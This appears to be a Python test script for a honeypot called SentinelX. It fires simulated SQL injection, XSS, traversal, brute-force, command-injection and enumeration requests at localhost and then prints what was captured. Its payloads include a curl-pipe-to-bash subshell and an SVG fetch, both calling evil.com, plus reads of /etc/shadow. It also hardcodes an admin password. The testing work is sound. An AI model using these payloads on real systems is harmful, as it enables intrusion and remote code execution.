"""
SentinelX - Test Suite
Developer : Janith Warawita (Alerts and QA)

FIX v2:
  - Added Authorization header to all requests using the test JWT token,
    since /api/logs and /api/stats now require authentication.
  - Directory traversal tests now use encoded URLs (%2e%2e%2f) rather than
    literal ../../.. paths — curl normalizes those before sending, so the
    raw form never reaches the honeypot.
  - Removed reliance on python-requests user-agent triggering Reconnaissance.
"""

import requests
import time
from colorama import Fore, Style, init

init(autoreset=True)

BASE_URL      = "https://localhost:5001"
BACKEND_URL   = "https://localhost:5000"


def section(title):
    print(f"\n{Fore.CYAN}{'='*55}")
    print(f"  {title}")
    print(f"{'='*55}{Style.RESET_ALL}")


def get_auth_token():
    """Obtain a JWT token from the backend for authenticated API calls."""
    try:
        r = requests.post(
            f"{BACKEND_URL}/api/auth/login",
            json={"username": "admin", "password": "SentinelX@2026"},
            timeout=5,
            verify=False,
        )
        return r.json().get("token")
    except Exception:
        return None


def send(method, path, data=None, label=""):
    url = f"{BASE_URL}{path}"
    try:
        if method == "GET":
            r = requests.get(url, params=data, timeout=5, verify=False)
        else:
            r = requests.post(url, data=data, timeout=5, verify=False)
        color = Fore.GREEN if r.status_code in (200, 404) else Fore.YELLOW
        print(f"  {color}[{r.status_code}]{Style.RESET_ALL} {method} {path}  →  {label}")
    except Exception as e:
        print(f"  {Fore.RED}[ERR]{Style.RESET_ALL} {path} — {e}")


def show_results(token=None):
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    try:
        r    = requests.get(f"{BACKEND_URL}/api/logs?limit=6", headers=headers, timeout=5, verify=False)
        logs = r.json().get("logs", [])
        print(f"\n  {Fore.YELLOW}Last {len(logs)} captured events:{Style.RESET_ALL}")
        for log in logs:
            label = log.get("risk_label", "?")
            color = {"Critical": Fore.RED, "Medium": Fore.YELLOW, "Low": Fore.CYAN}.get(label, Fore.WHITE)
            print(
                f"  {color}[{label:8s}]"
                f"  {log.get('attack_type','?'):22s}"
                f"  Score: {log.get('risk_score',0):.1f}"
                f"  CVE: {log.get('cve_id') or 'N/A'}"
                f"{Style.RESET_ALL}"
            )
    except Exception as e:
        print(f"  {Fore.RED}Could not fetch logs: {e}{Style.RESET_ALL}")


# ── Test 1: SQL Injection ──────────────────────────────────────────────────────
section("TEST 1 — SQL Injection")
send("POST", "/admin-login", {"username": "' OR 1=1--",           "password": "x"}, "OR bypass")
send("POST", "/admin-login", {"username": "' UNION SELECT * --",  "password": "x"}, "UNION")
send("POST", "/admin-login", {"username": "'; DROP TABLE users;--","password": "x"}, "DROP TABLE")
send("POST", "/admin-login", {"username": "' AND SLEEP(5)--",     "password": "x"}, "Time-based")
time.sleep(0.3)

# ── Test 2: XSS ───────────────────────────────────────────────────────────────
section("TEST 2 — Cross-Site Scripting (XSS)")
send("POST", "/admin-login", {"username": "<script>alert('XSS')</script>",         "password": "x"}, "Script tag")
send("POST", "/admin-login", {"username": "<img src=x onerror=alert(1)>",          "password": "x"}, "img onerror")
send("POST", "/admin-login", {"username": "javascript:document.cookie",            "password": "x"}, "JS protocol")
send("POST", "/admin-login", {"username": "<svg onload=fetch('http://evil.com')>", "password": "x"}, "SVG onload")
time.sleep(0.3)

# ── Test 3: Directory Traversal ───────────────────────────────────────────────
# Use URL-encoded paths — literal ../../ gets normalized by the HTTP client
# before the request is sent and never reaches the honeypot.
section("TEST 3 — Directory Traversal (encoded paths)")
send("GET",  "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",        label="URL-encoded etc/passwd")
send("GET",  "/%2e%2e%2f%2e%2e%2fetc%2fshadow",        label="URL-encoded etc/shadow")
send("GET",  "/api/v1/users?file=../../../etc/hosts",   label="Param traversal")
send("GET",  "/internal-docs/../../../windows/system32",label="Windows path")
time.sleep(0.3)

# ── Test 4: Brute Force ───────────────────────────────────────────────────────
section("TEST 4 — Brute Force Login")
for pwd in ["password", "123456", "admin", "letmein", "qwerty", "password123"]:
    send("POST", "/admin-login", {"username": "admin", "password": pwd}, f"trying: {pwd}")
    time.sleep(0.15)

# ── Test 5: Reconnaissance ────────────────────────────────────────────────────
section("TEST 5 — Reconnaissance / Scanning")
for path in ["/robots.txt", "/.git/config", "/.git/HEAD", "/phpinfo.php",
             "/sitemap.xml", "/wp-admin", "/phpmyadmin", "/server-status"]:
    send("GET", path, label="Recon probe")
    time.sleep(0.15)

# ── Test 6: Command Injection ─────────────────────────────────────────────────
section("TEST 6 — Command Injection")
send("POST", "/api/v1/users", {"query": "id; ls -la"},                              "id + ls")
send("POST", "/api/v1/users", {"query": "| whoami"},                                "pipe whoami")
send("POST", "/api/v1/users", {"query": "`cat /etc/passwd`"},                       "backtick")
send("POST", "/api/v1/users", {"query": "$(curl http://evil.com/shell.sh | bash)"}, "subshell")
time.sleep(0.3)

# ── Test 7: Sensitive File Access ─────────────────────────────────────────────
section("TEST 7 — Sensitive File Access")
for path in ["/.env", "/backup.zip", "/db_backup.sql",
             "/internal-docs", "/api/v1/admin/config"]:
    send("GET", path, label="Sensitive access")
    time.sleep(0.15)

# ── Test 8: API Enumeration ───────────────────────────────────────────────────
section("TEST 8 — API Enumeration")
for path in ["/api/v1/users", "/api/v1/admin/config",
             "/api/v2/users", "/api/internal/tokens"]:
    send("GET", path, label="API probe")
    time.sleep(0.15)

# ── Results ───────────────────────────────────────────────────────────────────
section("RESULTS — What the honeypot captured")
time.sleep(1)

token = get_auth_token()
if not token:
    print(f"  {Fore.YELLOW}[WARN] Could not get auth token — "
          f"is the backend running on port 5000?{Style.RESET_ALL}")

show_results(token)

if token:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r     = requests.get(f"{BACKEND_URL}/api/stats", headers=headers, timeout=5, verify=False)
        stats = r.json()
        print(f"\n  Total events  : {stats['total_events']}")
        print(f"  Critical      : {stats['critical_count']}")
        print(f"  Medium        : {stats['medium_count']}")
        print(f"  Low           : {stats['low_count']}")
        print(f"  Breakdown     : {stats['attack_breakdown']}")
        print(f"\n{Fore.GREEN}  Done. Full stats: {BACKEND_URL}/api/stats{Style.RESET_ALL}\n")
    except Exception as e:
        print(f"  {Fore.RED}Stats fetch failed: {e}{Style.RESET_ALL}")
